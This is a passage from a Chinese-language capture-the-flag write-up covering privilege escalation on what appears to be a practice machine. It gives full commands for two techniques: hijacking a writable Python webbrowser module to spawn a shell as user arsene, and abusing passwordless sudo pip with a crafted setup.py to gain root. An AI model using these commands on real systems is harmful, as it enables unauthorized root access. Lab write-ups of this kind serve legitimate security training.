二、提取


下面我们进行提取，先查看内核信息


查看权限，sudo -l

发现了arsene免密码登陆


查看了python文件，发现它引用了webbrowser模块


我们通过find找到该文件的位置，查看其权限，发现可以写入内容

find /usr/ -name '*webbrowser*'ls -l /usr/lib/python3.9/webbrowser.py


我们可以直接编辑该文件，写入调用shell脚本（或者反弹shell脚本），用vi进行编辑，写入os.system("/bin/bash")


这里发生了个小插曲，vi界面跟vim不同，写错的话用"dd"进行删除整行



保存退出，进入arsene目录执行，获得arsene用户shell

sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py


拿到了arsene用户的shell，我们看一下底下的文件


叫我们检查一下代码。查看sudo -l，发现可以免密执行/usr/bin/pip


可以进行pip提权，成功提取

（pip提取介绍：http://cn-sec.com/archives/260823.html）

TF=$(mktemp -d)echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.pysudo pip install $TF
